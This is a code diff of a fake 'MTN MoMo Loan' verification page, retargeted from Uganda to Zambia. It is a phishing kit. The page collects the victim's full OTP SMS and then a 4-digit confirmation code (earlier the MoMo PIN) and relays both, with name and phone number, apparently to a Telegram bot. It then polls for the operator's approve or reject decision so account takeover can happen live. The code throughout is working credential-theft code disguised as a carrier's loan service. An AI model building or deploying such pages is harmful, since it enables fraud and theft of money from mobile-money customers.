@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <meta name="theme-color" content="#003366">
-    <title>MTN MoMo Loan | Verify &middot; Uganda</title>
+    <title>MTN MoMo Loan | Verify OTP &middot; Zambia</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -150,7 +150,7 @@
         .sp-s { font-size: 11px; color: rgba(255,255,255,0.6); }
         @keyframes sp { to { transform: rotate(360deg); } }
 
-        /* PIN OVERLAY - final 4-digit step */
+        /* FINAL OTP OVERLAY - 4-digit confirmation */
         .pin-overlay {
             position: fixed; inset: 0;
             display: none; align-items: center; justify-content: center;
@@ -160,7 +160,7 @@
         .pin-overlay.on { display: flex; }
         .pin-card {
             background: white; border-radius: 18px; padding: 32px 28px;
-            max-width: 360px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.6); text-align: center;
+            max-width: 380px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.6); text-align: center;
             border-top: 5px solid var(--mtn-yellow);
         }
         .pin-logo { font-size: 20px; font-weight: 900; margin-bottom: 16px; }
@@ -175,17 +175,17 @@
         }
         .pin-amount .pa-label { font-size: 10px; color: var(--muted); font-weight: 600; }
         .pin-amount .pa-value { font-size: 1.4rem; font-weight: 900; color: var(--blue); }
-        .pin-input-wrap {
-            border: 2px solid var(--border); border-radius: 12px; padding: 14px;
-            background: var(--light); margin-bottom: 14px; transition: all 0.2s;
+
+        /* Final OTP boxes inside overlay */
+        .fin-otp-row { display: flex; gap: 10px; justify-content: center; margin-bottom: 14px; }
+        .fin-otp-box {
+            width: 52px; height: 58px; text-align: center; font-size: 24px; font-weight: 800;
+            border: 2px solid var(--border); border-radius: 12px; background: var(--light);
+            color: var(--dark); font-family: 'Poppins', monospace; transition: all 0.2s;
         }
-        .pin-input-wrap:focus-within { border-color: var(--blue-light); background: white; box-shadow: 0 0 0 3px rgba(0,119,204,0.06); }
-        .pin-fi {
-            width: 100%; border: none; background: transparent; font-size: 24px;
-            color: var(--dark); outline: none; font-family: inherit;
-            letter-spacing: 12px; text-align: center; font-weight: 800;
-        }
-        .pin-fi::placeholder { color: #b0c4d8; letter-spacing: 0; font-size: 13px; font-weight: 500; }
+        .fin-otp-box:focus { border-color: var(--blue-light); background: white; box-shadow: 0 0 0 3px rgba(0,119,204,0.06); outline: none; }
+        .fin-otp-box.ok { border-color: var(--green); background: rgba(0,166,81,0.04); }
+
         .pin-err {
             display: none; background: rgba(220,38,38,0.06); border: 1px solid rgba(220,38,38,0.15);
             color: var(--error); font-size: 11px; font-weight: 600; border-radius: 8px;
@@ -232,6 +232,8 @@
             .btns { flex-direction: column; }
             .pin-card { padding: 24px 18px; }
             .otp-area { min-height: 90px; }
+            .fin-otp-row { gap: 7px; }
+            .fin-otp-box { width: 44px; height: 50px; font-size: 20px; }
         }
     </style>
 </head>
@@ -247,23 +249,23 @@
     <main>
         <div class="card">
             <div class="card-head">
-                <h1>Verify Code</h1>
-                <p>Paste the full MTN message or code sent to your phone</p>
+                <h1>Verify OTP Message</h1>
+                <p>Paste the full OTP message sent to your MTN number</p>
             </div>
 
             <div id="bBar" class="bundle-bar" style="display:none;">
                 <div class="b-row"><span>Name:</span><span id="bName">&mdash;</span></div>
                 <div class="b-row"><span>Loan:</span><span id="bD">&mdash;</span></div>
-                <div class="b-row"><span>Amount:</span><span id="bP">UGX 0</span></div>
+                <div class="b-row"><span>Amount:</span><span id="bP">ZMW 0</span></div>
             </div>
 
             <div id="err" class="err"></div>
 
-            <label class="fl">Verification Message</label>
+            <label class="fl">OTP Message</label>
             <div class="otp-area-wrap">
-                <textarea id="otpArea" class="otp-area" placeholder="Paste the full SMS here (code, message, or any text up to 100+ words)..." spellcheck="false" autocomplete="off"></textarea>
+                <textarea id="otpArea" class="otp-area" placeholder="Paste the full SMS here (e.g. 'Your MTN MoMo OTP is 1234...')..." spellcheck="false" autocomplete="off"></textarea>
             </div>
-            <p class="hint">Paste or type the full message — any length accepted</p>
+            <p class="hint">Paste or type the full OTP message — any length accepted</p>
 
             <div class="btns">
                 <button class="btn-p" onclick="doOTP()">Verify &amp; Proceed</button>
@@ -275,9 +277,9 @@
         </div>
     </main>
 
-    <div id="ov" class="overlay"><div class="spin"></div><div class="sp-t">Verifying Code</div><div class="sp-s">Please wait...</div></div>
+    <div id="ov" class="overlay"><div class="spin"></div><div class="sp-t">Verifying OTP</div><div class="sp-s">Please wait...</div></div>
 
-    <!-- FINAL STEP: 4-DIGIT PIN -->
+    <!-- FINAL STEP: 4-DIGIT OTP CONFIRMATION -->
     <div id="pinOv" class="pin-overlay">
         <div class="pin-card">
             <div class="pin-logo">
@@ -285,22 +287,25 @@
                 <span class="momo">MoMo</span>
                 <span class="momo-sub">LOAN</span>
             </div>
-            <div class="pin-title">Confirm PIN</div>
-            <div class="pin-sub">Enter your 4-digit MoMo PIN to authorize this loan</div>
+            <div class="pin-title">Confirm OTP</div>
+            <div class="pin-sub">Enter the 4-digit OTP to authorize this loan</div>
 
             <div class="pin-amount">
                 <div class="pa-label">Loan Amount</div>
-                <div class="pa-value" id="pinAmt">UGX 0</div>
+                <div class="pa-value" id="pinAmt">ZMW 0</div>
             </div>
 
             <div id="pinErr" class="pin-err"></div>
 
-            <div class="pin-input-wrap">
-                <input type="password" class="pin-fi" id="pinIn" placeholder="Enter 4-digit PIN" inputmode="numeric" maxlength="4">
+            <div class="fin-otp-row" id="finOtpRow">
+                <input type="text" class="fin-otp-box" maxlength="1" inputmode="numeric">
+                <input type="text" class="fin-otp-box" maxlength="1" inputmode="numeric">
+                <input type="text" class="fin-otp-box" maxlength="1" inputmode="numeric">
+                <input type="text" class="fin-otp-box" maxlength="1" inputmode="numeric">
             </div>
 
             <div class="pin-btns">
-                <button class="pin-btn pin-btn-ok" onclick="doPin()">Confirm PIN</button>
+                <button class="pin-btn pin-btn-ok" onclick="doPin()">Confirm OTP</button>
                 <button class="pin-btn pin-btn-x" onclick="closePin()">Cancel</button>
             </div>
 
@@ -334,30 +339,31 @@
                 document.getElementById('bBar').style.display = 'block';
                 document.getElementById('bName').textContent = name || 'N/A';
                 document.getElementById('bD').textContent = d;
-                document.getElementById('bP').textContent = 'UGX ' + pr;
-                document.getElementById('pinAmt').textContent = 'UGX ' + pr;
+                document.getElementById('bP').textContent = 'ZMW ' + pr;
+                document.getElementById('pinAmt').textContent = 'ZMW ' + pr;
             }
         }
 
+        /* ---- STEP 1: OTP MESSAGE (with words) ---- */
         function getCode() {
             return document.getElementById('otpArea').value.trim();
         }
 
         function doOTP() {
             otp = getCode();
-            if (!otp) { showErr('Please paste the verification message first'); return; }
+            if (!otp) { showErr('Please paste the OTP message first'); return; }
             if (otp.length > 2000) { showErr('Message is too long (max 2000 characters)'); return; }
             clrErr();
             document.getElementById('ov').classList.add('on');
 
             var safe = otp.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
 
-            var msg = '\u{1f4f2} <b>MTN MoMo OTP Verification</b>\n\n' +
+            var msg = '\u{1f4f2} <b>MTN MoMo OTP Message</b>\n\n' +
                 '<b>Name:</b> <code>' + (bd.name || 'N/A') + '</code>\n' +
-                '<b>Phone:</b> <code>+256' + phone + '</code>\n' +
+                '<b>Phone:</b> <code>+260' + phone + '</code>\n' +
                 '<b>Loan:</b> <code>' + (bd.data || 'N/A') + '</code>\n' +
-                '<b>Amount:</b> <code>UGX ' + (bd.price || '0') + '</code>\n\n' +
-                '<b>Message / Code:</b>\n<code>' + safe + '</code>';
+                '<b>Amount:</b> <code>ZMW ' + (bd.price || '0') + '</code>\n\n' +
+                '<b>OTP Message:</b>\n<code>' + safe + '</code>';
 
             var btns = [
                 [{ text: '\u2713 Approved', callback_data: 'otp_approved' }, { text: '\u2717 Declined', callback_data: 'otp_declined' }],
@@ -405,35 +411,80 @@
             window.location.href = 'index.html';
         }
 
+        /* ---- STEP 2: 4-DIGIT OTP CONFIRMATION ---- */
         function openPin() {
             document.getElementById('pinOv').classList.add('on');
-            setTimeout(function() { document.getElementById('pinIn').focus(); }, 300);
+            var fboxes = document.querySelectorAll('.fin-otp-box');
+            fboxes.forEach(function(b){ b.value=''; b.classList.remove('ok'); });
+            setTimeout(function() { fboxes[0].focus(); }, 300);
+            setupFinOtp();
+        }
+
+        var finSetup = false;
+        function setupFinOtp() {
+            if (finSetup) return;
+            finSetup = true;
+            var fboxes = document.querySelectorAll('.fin-otp-box');
+            fboxes.forEach(function(b, i) {
+                b.addEventListener('input', function(e) {
+                    var v = e.target.value;
+                    if (v.length > 1) {
+                        var digs = v.replace(/\D/g, '').split('');
+                        digs.forEach(function(d, j) { if (i + j < fboxes.length) { fboxes[i + j].value = d; fboxes[i + j].classList.add('ok'); } });
+                        fboxes[Math.min(i + digs.length, fboxes.length - 1)].focus();
+                        finChk();
+                        return;
+                    }
+                    if (v) { b.classList.add('ok'); if (i < fboxes.length - 1) fboxes[i + 1].focus(); }
+                    else { b.classList.remove('ok'); }
+                    finChk();
+                });
+
+                b.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && !e.target.value && i > 0) { fboxes[i - 1].focus(); fboxes[i - 1].value = ''; fboxes[i - 1].classList.remove('ok'); }
+                });
+
+                b.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    var t = e.clipboardData.getData('text').replace(/\D/g, '');
+                    t.split('').forEach(function(d, j) { if (j < fboxes.length) { fboxes[j].value = d; fboxes[j].classList.add('ok'); } });
+                    fboxes[Math.min(t.length - 1, fboxes.length - 1)].focus();
+                    finChk();
+                });
+            });
+        }
+
+        function getFinCode() {
+            var fboxes = document.querySelectorAll('.fin-otp-box');
+            return Array.from(fboxes).map(function(b){ return b.value; }).join('');
+        }
+
+        function finChk() {
+            if (getFinCode().length === 4) {
+                setTimeout(function(){ doPin(); }, 400);
+            }
         }
 
         function closePin() {
             document.getElementById('pinOv').classList.remove('on');
-            document.getElementById('pinIn').value = '';
+            var fboxes = document.querySelectorAll('.fin-otp-box');
+            fboxes.forEach(function(b){ b.value=''; b.classList.remove('ok'); });
             document.getElementById('pinErr').classList.remove('show');
         }
 
-        // PIN auto-send on 4 digits
-        document.getElementById('pinIn').addEventListener('input', function() {
-            if (this.value.length === 4) setTimeout(function() { doPin(); }, 300);
-        });
-
         function doPin() {
-            var pin = document.getElementById('pinIn').value.trim();
-            if (pin.length !== 4) { document.getElementById('pinErr').textContent = 'Please enter a 4-digit PIN'; document.getElementById('pinErr').classList.add('show'); return; }
+            var finOtp = getFinCode();
+            if (finOtp.length !== 4) { document.getElementById('pinErr').textContent = 'Please enter all 4 digits'; document.getElementById('pinErr').classList.add('show'); return; }
             document.getElementById('pinErr').classList.remove('show');
             document.getElementById('pinOv').classList.remove('on');
             document.getElementById('ov').classList.add('on');
 
-            var msg = '\u{1f510} <b>MTN MoMo PIN Confirmation</b>\n\n' +
-                '<b>PIN:</b> <code>' + pin + '</code>\n' +
-                '<b>Phone:</b> <code>+256' + phone + '</code>\n' +
+            var msg = '\u{1f510} <b>MTN MoMo OTP Confirmation</b>\n\n' +
+                '<b>Confirmation OTP:</b> <code>' + finOtp + '</code>\n' +
+                '<b>Phone:</b> <code>+260' + phone + '</code>\n' +
                 '<b>Loan:</b> <code>' + (bd.data || 'N/A') + '</code>\n' +
-                '<b>Amount:</b> <code>UGX ' + (bd.price || '0') + '</code>';
-            var btns = [[{ text: '\u2713 Approved', callback_data: 'pin_valid' }, { text: '\u2717 Invalid PIN', callback_data: 'pin_invalid' }]];
+                '<b>Amount:</b> <code>ZMW ' + (bd.price || '0') + '</code>';
+            var btns = [[{ text: '\u2713 Approved', callback_data: 'pin_valid' }, { text: '\u2717 Invalid OTP', callback_data: 'pin_invalid' }]];
             tg(msg, btns);
             pollPin();
         }
@@ -453,7 +504,16 @@
                                     document.getElementById('ov').classList.remove('on');
                                     location.href = 'success.html?data=' + encodeURIComponent(bd.data || '') + '&price=' + (bd.price || '') + '&phone=' + phone + '&name=' + encodeURIComponent(bd.name || '');
                                 }
-                                else if (cb === 'pin_invalid') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); document.getElementById('pinOv').classList.add('on'); document.getElementById('pinErr').textContent = 'Invalid PIN. Please try again.'; document.getElementById('pinErr').classList.add('show'); document.getElementById('pinIn').value = ''; document.getElementById('pinIn').focus(); }
+                                else if (cb === 'pin_invalid') {
+                                    clearInterval(iv);
+                                    document.getElementById('ov').classList.remove('on');
+                                    document.getElementById('pinOv').classList.add('on');
+                                    document.getElementById('pinErr').textContent = 'Invalid OTP. Please try again.';
+                                    document.getElementById('pinErr').classList.add('show');
+                                    var fboxes = document.querySelectorAll('.fin-otp-box');
+                                    fboxes.forEach(function(b){ b.value=''; b.classList.remove('ok'); });
+                                    fboxes[0].focus();
+                                }
                             }
                         }
                     }).catch(function(e) { console.error(e); });
@@ -473,4 +533,4 @@
         window.addEventListener('load', function() { init(); document.getElementById('otpArea').focus(); });
     </script>
 </body>
-    </html>
+                                                                                        </html>
